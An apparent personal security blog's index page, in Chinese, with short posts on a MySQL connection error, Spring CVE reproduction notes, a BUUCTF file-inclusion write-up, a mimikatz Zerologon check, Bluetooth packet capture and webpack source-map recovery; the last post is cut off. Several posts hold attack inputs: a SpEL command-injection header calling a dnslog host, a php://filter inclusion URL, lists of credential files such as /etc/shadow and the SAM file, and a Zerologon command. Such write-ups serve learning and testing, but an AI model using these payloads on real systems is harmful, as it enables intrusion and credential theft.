<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Dhayser&#39;s space</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Dhayser&#39;s space">
<meta property="og:url" content="https://dhayser.github.io/index.html">
<meta property="og:site_name" content="Dhayser&#39;s space">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Dhayser Li">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Dhayser's space" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Dhayser&#39;s space</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://dhayser.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-Mysql数据库连接Public-Key-Retrieval-is-not-allowed" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/01/10/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5Public-Key-Retrieval-is-not-allowed/" class="article-date">
  <time class="dt-published" datetime="2023-01-10T07:48:57.000Z" itemprop="datePublished">2023-01-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/01/10/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5Public-Key-Retrieval-is-not-allowed/">Mysql数据库连接Public Key Retrieval is not allowed</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="连接报错"><a href="#连接报错" class="headerlink" title="连接报错"></a>连接报错</h2><p>官方文档：<a target="_blank" rel="noopener" href="https://mysqlconnector.net/connection-options/">链接</a>(以下内容摘至官网)<br>If the user account uses sha256_password authentication, the password must be protected during transmission; TLS is the preferred mechanism for this, but if it is not available then RSA public key encryption will be used. To specify the server’s RSA public key, use the ServerRSAPublicKeyFile connection string setting, or set AllowPublicKeyRetrieval&#x3D;True to allow the client to automatically request the public key from the server. Note that AllowPublicKeyRetrieval&#x3D;True could allow a malicious proxy to perform a MITM attack to get the plaintext password, so it is False by default and must be explicitly enabled.<br>由于当禁用SSL&#x2F;TLS 协议传输后，客户端会使用服务器的公钥进行传输，默认情况下客户端不会主动去找服务器拿公钥，此时就会出现上述错误。</p>
<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>数据库连接配置AllowPublicKeyRetrieval&#x3D;True即可</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://dhayser.github.io/2023/01/10/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5Public-Key-Retrieval-is-not-allowed/" data-id="clcpy5alr0007orhfgmzoa0gj" data-title="Mysql数据库连接Public Key Retrieval is not allowed" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Spring-Boot漏洞分析与利用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" class="article-date">
  <time class="dt-published" datetime="2022-12-30T13:10:19.000Z" itemprop="datePublished">2022-12-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">Spring Boot漏洞分析与利用</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Spring-Cloud-Function-SPEL表达式注入漏洞（CVE-2022-22963）"><a href="#Spring-Cloud-Function-SPEL表达式注入漏洞（CVE-2022-22963）" class="headerlink" title="Spring Cloud Function SPEL表达式注入漏洞（CVE-2022-22963）"></a>Spring Cloud Function SPEL表达式注入漏洞（CVE-2022-22963）</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>&#x2F;&#x2F;TODO</p>
<h2 id="版本"><a href="#版本" class="headerlink" title="版本:"></a>版本:</h2><p>jdk: 1.8<br>spring-cloud &lt;&#x3D; 2021.0.1<br>3.0.0.RELEASE &lt;&#x3D; org.springframework.cloud &lt;&#x3D; 3.2.2<br>spring-cloud-function: 3.2.2<br>找依赖可以在这里：<a target="_blank" rel="noopener" href="https://mvnrepository.com/">https://mvnrepository.com/</a><br>Mac快捷键查看这个：<a target="_blank" rel="noopener" href="https://blog.csdn.net/liaowenxiong/article/details/120229246">https://blog.csdn.net/liaowenxiong/article/details/120229246</a></p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>参数头传入spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(“ping ******.dnslog.cn”)<br><img src="https://dhayser.github.io/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/1.png" width="70%" height="70%" ><br>配合dnslog探测<br><img src="https://dhayser.github.io/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/2.png" width="70%" height="70%" >  </p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h2 id="x2F-x2F-TODO"><a href="#x2F-x2F-TODO" class="headerlink" title="&#x2F;&#x2F;TODO"></a>&#x2F;&#x2F;TODO</h2><h1 id="Spring-Cloud-Gateway-远程代码执行漏洞（CVE-2022-22947）"><a href="#Spring-Cloud-Gateway-远程代码执行漏洞（CVE-2022-22947）" class="headerlink" title="Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）"></a>Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）</h1><h2 id="基本介绍-1"><a href="#基本介绍-1" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>Spring Cloud Gateway 是 Spring Cloud 下的一个项目，该项目是基于 Spring 5.0、Spring Boot 2.0 和 Project Reactor 等技术开发的网关，它旨在为微服务架构提供一种简单有效、统一的 API 路由管理方式。</p>
<h2 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h2><p>Spring Cloud Gateway 3.1.x &lt; 3.1.1<br>Spring Cloud Gateway &lt; 3.0.7  </p>
<h2 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h2><ul>
<li>1.添加恶意路由(头需要声明Content-Type: application&#x2F;json)</li>
<li>2.刷新路由，使用浏览器访问url抓包改请求类型即可（此刻已经执行恶意代码）</li>
<li>3.查看路由记录的回显  <img src="https://dhayser.github.io/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/3.png" width="70%" height="70%" ></li>
</ul>
<h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h2 id="x2F-x2F-TODO-1"><a href="#x2F-x2F-TODO-1" class="headerlink" title="&#x2F;&#x2F;TODO"></a>&#x2F;&#x2F;TODO</h2><h1 id="Spring远程命令执行漏洞（CVE-2022-22965）"><a href="#Spring远程命令执行漏洞（CVE-2022-22965）" class="headerlink" title="Spring远程命令执行漏洞（CVE-2022-22965）"></a>Spring远程命令执行漏洞（CVE-2022-22965）</h1><h2 id="基本介绍-2"><a href="#基本介绍-2" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>&#x2F;&#x2F;TODO</p>
<h2 id="版本-2"><a href="#版本-2" class="headerlink" title="版本"></a>版本</h2><p>Spring Framework 5.3.x &lt; 5.3.18<br>Spring Framework 5.2.x &lt; 5.2.20</p>
<h2 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h2><ul>
<li>1.发起恶意请求，写入jsp木马  </li>
<li>2.远程命令执行  <img src="https://dhayser.github.io/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/4.png" width="70%" height="70%" ></li>
</ul>
<h2 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&#x2F;&#x2F;TODO</p>
<p>获取到一个类对象后，就可以调用这个类中的一些方法，当获取到Class对象后，变相的获取了所有Class类的对象，通过调用这个Class类下实例对象的方法，就相当于调用了实例对象的方法</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://dhayser.github.io/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" data-id="clcpy5alr0006orhf7snx1j6o" data-title="Spring Boot漏洞分析与利用" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Buuctf-Secret-File" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/12/25/Buuctf-Secret-File/" class="article-date">
  <time class="dt-published" datetime="2022-12-25T04:09:58.000Z" itemprop="datePublished">2022-12-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/12/25/Buuctf-Secret-File/">Buuctf-Secret File</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CTF练习"><a href="#CTF练习" class="headerlink" title="CTF练习"></a>CTF练习</h1><p>前置小知识点：<br>发送请求时发现一个小点，Location 首部指定的是需要将页面重新定向至的地址（相对路径、绝对路径）。一般在响应码为 3xx 的响应中才会有意义。<br><img src="https://dhayser.github.io/2022/12/25/Buuctf-Secret-File/2.png" width="50%" height="50%" ><br>php中引发文件包含漏洞的通常是以下四个函数：</p>
<ul>
<li>include()</li>
<li>include_once()</li>
<li>require()</li>
<li>require_once()</li>
</ul>
<h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>1、查看前端源代码，发现有个Location跳转，然后发现了我们应该审计的PHP文件；<br><img src="https://dhayser.github.io/2022/12/25/Buuctf-Secret-File/3.png" width="50%" height="50%" ><br>2、利用思路，哪些参数我们可控制，我们可以修改并让系统执行，发现file参数符合我们上边的描述，我们可以手动传几个参数找一找感觉。<br>传flag.php文件，没拿到我们预期想要看的东西，返回继续看源代码吧；<br><img src="https://dhayser.github.io/2022/12/25/Buuctf-Secret-File/4.png" width="50%" height="50%" ><br>3、<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.stristr.php">stristr()</a>、<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.include.php">include()</a>函数，分别用来判断参数内传入参数是否为stristr()里的值和用来文件包含读取include()内参数文件。那么我们就一个知道，我们的做题思路应该是先把收入的参数变量$file饶过if stristr()的判断，然后将$file传给include()进行文件包含查看；<br><img src="https://dhayser.github.io/2022/12/25/Buuctf-Secret-File/6.png" width="30%" height="30%" ><br>4、下一步我们就应该开始看如何进行饶过并且文件包含读取php文件，使用php<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">伪协议（封装协议）</a>进行文件读取，因为代码本身限制tp(不能远程文件读取)、input(不能执行代码)、data字符(不能执行代码)，所以选择使用php:&#x2F;&#x2F;filter。<br><img src="https://dhayser.github.io/2022/12/25/Buuctf-Secret-File/5.png" width="50%" height="50%" ><br>如果单纯使用php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;file.php要读取的文件会被执行，所以我们需要添加转换<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.convert.php">过滤器</a>:convert.base64-encode对读取的内容进行base64编码防止其执行，最终构造出的文件包含内容为php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file.php，用来读取文件，可以把file.php替换成我们想要看的flag.php文件；<br><code>http://8.8.8.8:81/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code><br>5、读取经过编码的flag.php文件，发现成功被base64加密;<br><img src="https://dhayser.github.io/2022/12/25/Buuctf-Secret-File/7.png" width="50%" height="50%" ><br>6、对base64进行解码；<br><img src="https://dhayser.github.io/2022/12/25/Buuctf-Secret-File/8.png" width="50%" height="50%" >  </p>
<h2 id="实战文件读取利用点（读取文件）"><a href="#实战文件读取利用点（读取文件）" class="headerlink" title="实战文件读取利用点（读取文件）"></a>实战文件读取利用点（读取文件）</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">c:\<span class="title">boot.ini</span> // 查看系统版本</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">windows</span>\<span class="title">system32</span>\<span class="title">inetsrv</span>\<span class="title">MetaBase.xml</span> // <span class="title">IIS</span>配置文件</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">windows</span>\<span class="title">repair</span>\<span class="title">sam</span> // 存储<span class="title">Windows</span>系统初次安装的密码</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">ProgramFiles</span>\<span class="title">mysql</span>\<span class="title">my.ini</span> // <span class="title">MySQL</span>配置</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">ProgramFiles</span>\<span class="title">mysql</span>\<span class="title">data</span>\<span class="title">mysql</span>\<span class="title">user.MYD</span> // <span class="title">MySQL</span> <span class="title">root</span>密码</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">windows</span>\<span class="title">php.ini</span> // <span class="title">php</span> 配置信息</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd // 账户信息</span><br><span class="line"></span><br><span class="line">/etc/shadow // 账户密码文件</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</span><br><span class="line"></span><br><span class="line">/usr/local/app/php5/lib/php.ini // PHP相关配置</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</span><br><span class="line"></span><br><span class="line">/etc/my.conf // mysql 配置文件</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://dhayser.github.io/2022/12/25/Buuctf-Secret-File/" data-id="clcpy5alp0002orhfamjhhx9q" data-title="Buuctf-Secret File" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CVE-2020-1472复现分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/12/23/CVE-2020-1472%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2022-12-23T14:44:07.000Z" itemprop="datePublished">2022-12-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/12/23/CVE-2020-1472%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">CVE-2020-1472复现分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><p>我本地有个服务器，用的pve起了个虚拟化平台，你可以自己用虚拟机软件自己搭建一下环境，以下IP都是虚拟的，实际IP自己定。<br>小域控结构，比较简单，主要用来演示：<br><img src="https://dhayser.github.io/2022/12/23/CVE-2020-1472%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/1.png"><br>&#x2F;&#x2F; 搭建域环境过程的小tips</p>
<ul>
<li>域内成员要与AD域控的445端口通讯；</li>
<li>DNS服务器要设置成你建立的用于域控与域成员通讯的DNS，我这里用的是直接把AD域控也用作DNS服务器；</li>
</ul>
<h2 id="二、POC漏洞验证-mimikatz-exe"><a href="#二、POC漏洞验证-mimikatz-exe" class="headerlink" title="二、POC漏洞验证-mimikatz.exe"></a>二、POC漏洞验证-mimikatz.exe</h2><p>在域成员中执行以下命令，这里是借用的mimikatz自带的zerologon进行验证测试。</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::zerologon /target:<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">245</span> /account:WIN-J4TSHEMKM3T$&quot;</span><br></pre></td></tr></table></figure>
<p>存在漏洞效果：<br><img src="https://dhayser.github.io/2022/12/23/CVE-2020-1472%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/2.png"></p>
<h2 id="三、EXP漏洞利用-py脚本"><a href="#三、EXP漏洞利用-py脚本" class="headerlink" title="三、EXP漏洞利用-py脚本"></a>三、EXP漏洞利用-py脚本</h2><p>建议创建虚拟环境env，可以参考其他<a target="_blank" rel="noopener" href="https://blog.csdn.net/ARPOSPF/article/details/113616988">博客链接</a>，后续我想找官网教程的时候我再更新，🐑之后真的无力气。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://dhayser.github.io/2022/12/23/CVE-2020-1472%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" data-id="clcpy5alq0003orhf1age3rus" data-title="CVE-2020-1472复现分析" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Bluetooth抓包分析初识" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/12/23/Bluetooth%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%86/" class="article-date">
  <time class="dt-published" datetime="2022-12-23T08:23:33.000Z" itemprop="datePublished">2022-12-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/12/23/Bluetooth%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%86/">Bluetooth抓包分析初识</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="原由"><a href="#原由" class="headerlink" title="原由"></a>原由</h1><h4 id="工作有接触到蓝牙，但是一直没有很好的理解，于是尝试一下从数据包分析一下。"><a href="#工作有接触到蓝牙，但是一直没有很好的理解，于是尝试一下从数据包分析一下。" class="headerlink" title="工作有接触到蓝牙，但是一直没有很好的理解，于是尝试一下从数据包分析一下。"></a>工作有接触到蓝牙，但是一直没有很好的理解，于是尝试一下从数据包分析一下。</h4><h2 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h2><ol>
<li>安卓手机 Pixel3</li>
<li>笔记本电脑</li>
<li>其他的蓝牙设备：无线蓝牙鼠标、无线蓝牙键盘、带蓝牙功能手机</li>
</ol>
<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>获取蓝牙数据包，我采用的是手机开启开发者模式，开启Bluetooth HCI snoop log，并使用adb bugreport turnonphoneandscan.zip，将日志保存到本地电脑读取btsnoop_hci.log文件。实际搜索过程中发现有一些文章通过&#x2F;sdcard目录也能直接导出btsnoop_hci.log文件，但是我的没成功，只能用比较麻烦的方式先能实现效果，优雅程度以后再说。  </p>
<h2 id="扫描，流量包分析"><a href="#扫描，流量包分析" class="headerlink" title="扫描，流量包分析"></a>扫描，流量包分析</h2><ul>
<li>我的数据包可以到这里<a href="https://dhayser.github.io/2022/12/23/Bluetooth%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%86/btsnoop_hci.log">下载</a><br>1、通过现象看本质<br>此处通过在手机上开启蓝牙，添加匹配新设备（扫描）的时候的数据包。在扫描的时候host会发给controller指令，开始会约定扫描的时间，让controller在12.8s之内去寻找蓝牙设备;<br><img src="https://dhayser.github.io/2022/12/23/Bluetooth%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%86/1.png"><br>扫描结束之后，controller看到时间了会给host发一个消息，通知时间到了结束扫描;<br><img src="https://dhayser.github.io/2022/12/23/Bluetooth%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%86/2.png"><br>随后controller会将扫描到的结果返回给host，这里看到的是RedMe Note 7 Pro。<br><img src="https://dhayser.github.io/2022/12/23/Bluetooth%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%86/3.png"></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://dhayser.github.io/2022/12/23/Bluetooth%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%86/" data-id="clcpy5alq0004orhf8n0y5pgu" data-title="Bluetooth抓包分析初识" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-webpack前端源码还原漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/12/07/webpack%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81%E8%BF%98%E5%8E%9F%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2022-12-07T02:00:37.000Z" itemprop="datePublished">2022-12-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/12/07/webpack%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81%E8%BF%98%E5%8E%9F%E6%BC%8F%E6%B4%9E/">webpack前端源码还原漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Webpack"><a href="#Webpack" class="headerlink" title="Webpack"></a>Webpack</h2><p><a target="_blank" rel="noopener" href="https://webpack.js.org/concepts/">介绍</a>:用来打包前端静态页面，使用的时候应该合理配置，错误的配置可能会影响系统的安全性。</p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="webpack源码还原漏洞"><a href="#webpack源码还原漏洞" class="headerlink" title="webpack源码还原漏洞"></a>webpack源码还原漏洞</h3><ol>
<li>站点探测，发现系统图标为vue图标，f12查看源码之后可以看到webpack:&#x2F;&#x2F;字样；<br><img src="https://dhayser.github.io/2022/12/07/webpack%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81%E8%BF%98%E5%8E%9F%E6%BC%8F%E6%B4%9E/1.png"></li>
<li>获取js，如果你看到app.<em>.js文件中有.map后缀的字样，你就可以把</em>.map文件下载了，如果没有可以先放弃了。<br><img src="https://dhayser.github.io/2022/12/07/webpack%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81%E8%BF%98%E5%8E%9F%E6%BC%8F%E6%B4%9E/2.png"></li>
<li>下载*.map文件，我这里下载的是”<a target="_blank" rel="noopener" href="https://8.8.8.8/js/app.cd79a2ad.js.map&quot;%E3%80%82%E8%BF%99%E9%87%8C%E6%9C%89%E4%B8%AA%E5%B0%8F%E7%82%B9%EF%BC%8C%E4%BD%A0%E5%8F%AF%E4%BB%A5%E4%B8%8D%E7%AE%A1%E4%BB%BB%E4%BD%95%E7%AB%99%E7%82%B9%E9%83%BD%E5%8F%AF%E4%BB%A5%E5%9C%A8js%E5%90%8E%E9%9D%A2%E5%8A%A0%E4%B8%AA.map%E8%AF%95%E8%AF%95%E8%83%BD%E4%B8%8D%E8%83%BD%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%9C%89%E4%BA%9B%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E5%8F%AF%E8%83%BD%E5%8F%AA%E6%98%AF%E6%8A%8A%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%94%B9%E4%BA%86%EF%BC%8C%E4%BD%86%E6%98%AF.map%E6%96%87%E4%BB%B6%E5%B9%B3%E6%B2%A1%E6%9C%89%E5%88%A0%E9%99%A4%E3%80%82">https://8.8.8.8/js/app.cd79a2ad.js.map&quot;。这里有个小点，你可以不管任何站点都可以在js后面加个.map试试能不能下载，因为有些开发人员可能只是把配置文件改了，但是.map文件平没有删除。</a><br><img src="https://dhayser.github.io/2022/12/07/webpack%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81%E8%BF%98%E5%8E%9F%E6%BC%8F%E6%B4%9E/3.png"></li>
<li>还原代码，你需要安装nodejs，<a target="_blank" rel="noopener" href="https://nodejs.org/en/download/">安装教程</a>，安装之后你需要试验一下npm -v ，如果显示了npm的版本，恭喜你npm安装成功了。现在我们正式开始还原代码，首先需要安装reverse-sourcemap。再你需要使用reverse-sourcemap进行还原代码。<br><img src="https://dhayser.github.io/2022/12/07/webpack%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81%E8%BF%98%E5%8E%9F%E6%BC%8F%E6%B4%9E/4.png"><br>使用命令：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reverse-sourcemap --output-dir ./文件夹 app.cd79a2ad.js.map</span><br></pre></td></tr></table></figure>
正式还原：</li>
</ol>
<p><img src="https://dhayser.github.io/2022/12/07/webpack%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81%E8%BF%98%E5%8E%9F%E6%BC%8F%E6%B4%9E/5.png"><br>5. 分析源码，有时候开发人员会把测试账号、配置文件、测试站点放在前端，那么就提供了突破站点的机会，你可以利用它，如果没有发现什么大的利用点，本身webpack代码还原就是个漏洞你可以将他写到report里。<br><img src="https://dhayser.github.io/2022/12/07/webpack%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81%E8%BF%98%E5%8E%9F%E6%BC%8F%E6%B4%9E/6.png"></p>
<h2 id="总结、漏洞修复"><a href="#总结、漏洞修复" class="headerlink" title="总结、漏洞修复"></a>总结、漏洞修复</h2><p>该漏洞更多是获取的vue源码，如果想利用该点继续扩大影响范围，还需后续对源码分析。</p>
<ol>
<li>项目路径下修改 config&#x2F;index.js 中 build 对象 productionSourceMap: false</li>
<li>删除或移除*.js.map文件</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://dhayser.github.io/2022/12/07/webpack%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81%E8%BF%98%E5%8E%9F%E6%BC%8F%E6%B4%9E/" data-id="clcpy5als000aorhf2f002nwo" data-title="webpack前端源码还原漏洞" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-内存取证初识（一）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/11/30/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%88%9D%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2022-11-30T06:37:03.000Z" itemprop="datePublished">2022-11-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/11/30/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%88%9D%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/">内存取证初识（一）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
